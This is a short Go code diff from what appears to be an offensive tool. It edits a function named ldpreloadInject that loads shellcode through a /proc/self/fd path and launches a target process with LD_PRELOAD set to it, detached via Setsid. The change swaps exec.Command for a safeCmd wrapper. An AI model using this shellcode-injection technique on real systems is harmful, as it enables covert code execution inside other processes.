@@ -6,7 +6,6 @@ import (
 	"encoding/binary"
 	"fmt"
 	"os"
-	"os/exec"
 	"strings"
 	"syscall"
 	"unsafe"
@@ -38,7 +37,7 @@ func ldpreloadInject(shellcode []byte, target string) (string, error) {
 	path := fmt.Sprintf("/proc/self/fd/%d", fd)
 
 	parts := strings.Fields(target)
-	cmd := exec.Command(parts[0], parts[1:]...)
+	cmd := safeCmd(parts[0], parts[1:]...)
 	cmd.Env = append(os.Environ(), "LD_PRELOAD="+path)
 	cmd.SysProcAttr = &syscall.SysProcAttr{
 		Setsid: true,
